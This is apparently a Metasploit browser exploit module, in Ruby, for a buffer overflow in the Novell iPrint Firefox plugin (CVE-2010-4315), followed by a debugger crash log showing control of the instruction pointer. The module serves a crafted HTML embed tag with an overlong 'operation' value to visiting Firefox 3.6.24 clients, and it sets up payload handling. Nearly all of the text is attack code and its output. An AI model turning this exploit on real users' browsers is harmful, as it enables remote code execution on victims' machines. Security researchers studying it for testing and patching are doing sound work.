require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell iPrint Client Browser Plugin Operation Parameter PoC',
			'Description'    => %q{
					This module is simply a trigger for the Mozilla browser plugin npnipp.dll.
				This module was tested against npnipp.dll iPrint Plugin 1.0.0.1.
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-140/' ],
					[ 'CVE', '2010-4315' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'	=> "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 / FireFox 3.6.24', { 'Ret' => 0x41414141 } ]
				],
			'DisclosureDate' => 'Dec 26 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def auto_target(cli, request)

		mytarget = nil

		agent = request.headers['User-Agent']	
		
		if agent =~ /Firefox\/3\.6\.24/
			mytarget = targets[0]
		else
			print_error("Unsupported target..")
		end
		
		mytarget
	end	

	def on_request_uri(cli, request)

		mytarget = target

		if target.name == 'Windows XP SP3 / FireFox 3.6.24'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		sploit = pattern_create(1024)
		sploit[256, 4] = [target.ret].pack('V')

		content = %Q|
<html>
<body>
<embed type=application/x-Novell-ipp
operation=#{sploit}
</embed>
</body>
</html>
		|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
__END__
(4b8.4b0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=00000001 ecx=0012f100 edx=0012f174 esi=02b0bcea edi=02b0bc10
eip=41414141 esp=0012f278 ebp=0012f398 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
0:000> dd esp
0012f278  37494136 41384941 4a413949 314a4130
0012f288  41324a41 4a41334a 354a4134 41364a41
0012f298  4a41374a 394a4138 41304b41 4b41314b
0012f2a8  334b4132 41344b41 4b41354b 374b4136
0012f2b8  41384b41 4c41394b 314c4130 41324c41
0012f2c8  4c41334c 354c4134 41364c41 4c41374c
0012f2d8  394c4138 41304d41 4d41314d 334d4132
0012f2e8  41344d41 4d41354d 374d4136 41384d41
